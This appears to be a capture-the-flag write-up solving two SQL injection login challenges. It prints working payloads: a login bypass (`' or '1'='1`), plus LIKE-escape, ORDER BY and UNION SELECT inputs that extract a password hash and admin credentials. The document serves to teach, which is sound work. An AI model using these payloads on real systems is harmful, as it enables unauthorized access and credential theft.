## SQLi 1 / SQLi

![grafik](https://user-images.githubusercontent.com/84674087/134203849-9545248b-3071-4645-8aef-0f189a4da224.png)

#### Solution
- We enter `'` inside the username field and get below query information:

![grafik](https://user-images.githubusercontent.com/84674087/134769313-b4d6bdeb-09ee-43f9-95cb-46e4f0d757ac.png)

- We utilize this hint by entering a typical SQL injection inside the username field: `' or '1'='1`
- We get "Invalid login details"

![grafik](https://user-images.githubusercontent.com/84674087/134204439-0004d1d9-f866-4852-82b6-9d66e4c49936.png)

- Then we enter the same SQL injection in both fields: Success !

<br />

## SQLi 2 / SQLi

![grafik](https://user-images.githubusercontent.com/84674087/134689346-87c189a9-924e-4729-833a-d9a5a92674cf.png)

#### Solution
- When we click through the member alphabet we notice the parameter `?q=` in the URL:
![grafik](https://user-images.githubusercontent.com/84674087/134702569-65fce3cf-1e6e-402f-b9da-fef40acd5d7d.png)

- Being at section "D": We extend D to Derun (one available user) in the parameter
- The output is Derun only:

![grafik](https://user-images.githubusercontent.com/84674087/134702827-f2750dfb-2ea1-4875-8fea-8d3077c8a5af.png)

- We try to further manipulate the parameter by writing `Derun'`:
- The output is a Debug info: **DEBUG: SELECT username, admin FROM members WHERE username LIKE ... %'**

![grafik](https://user-images.githubusercontent.com/84674087/134702341-cbeb29aa-9e7c-4116-a73e-1e5f4e86edfd.png)

- The difference to SQLi1 is the WHERE clause, which does not contain `=` but the **LIKE Operator**
- The LIKE Operator is often used with wildcards such as: `%` `_` (FYR: [:https://www.w3schools.com/SQL/sql_like.asp](https://www.w3schools.com/SQL/sql_like.asp))
- For example, the SQL DB displays all usernames and admins when we enter `%` 
- Now the question: How can we manipulate the SQL query to present admins and their corresponding passwords ?? 
- Pro Tip: Go through each SQL operator, try to understand all of them and think about how to leverage those --> [www.w3schools.com/SQL](https://www.w3schools.com/SQL/default.asp)
- After a while we learn to escape the LIKE operator and use other operators subsequently
- My Trial & Error journey:
   - `___a%' AND password LIKE '`
   - `______x'; SELECT username FROM members WHERE username = 'Derun`
   - `%' ORDER BY admin ;--`
   - `%' ORDER BY 1--`
   - Until here it does no work out
   - `%' ORDER BY admin; '`
   - `%' ORDER BY admin DESC; '`
   - Now I notice that my SQL manipulation does have an effect onto the output (thanks to **ORDER BY Operator**)
   - By changing the admin order (ASC / DESC) I recognize that only bellamond is switching its position from top to bottom and vice versa
   - So, it seems this account is an admin
   - `%' UNION SELECT admin, password FROM members WHERE username LIKE '`
   - `%' UNION SELECT admin, password FROM members WHERE username LIKE '%' ORDER BY admin DESC; '` ... nearly
   - `%' UNION SELECT password, admin FROM members WHERE username LIKE '%' ORDER BY admin DESC; '` ... Yeah!
   - The **UNION Operator** helps to combine the result-set of two or more SELECT statements. 
   - I use the same table "members" but query different columns:
      -  **username, admin VS password, admin**
      -  The output is not handy and clear, but we realize that admins are displayed, but when there is no corresponding username, the password is shown instead
      -  More precisely: The SHA1 Hash (for bellamond: `1b774bc166f3f8918e900fcef8752817bae76a37`)
      -  This can be figured out here: [hash_identifier](https://hashes.com/en/tools/hash_identifier)

![grafik](https://user-images.githubusercontent.com/84674087/135313488-d88ff0dd-90cb-493d-8abf-03e1099e4888.png)

![grafik](https://user-images.githubusercontent.com/84674087/135313553-15f0fb5b-dab4-4659-80ac-cf73bb315d1d.png)

- When we enter username: **bellamond** and password: **sup3r** we pass the challenge :)

<br />
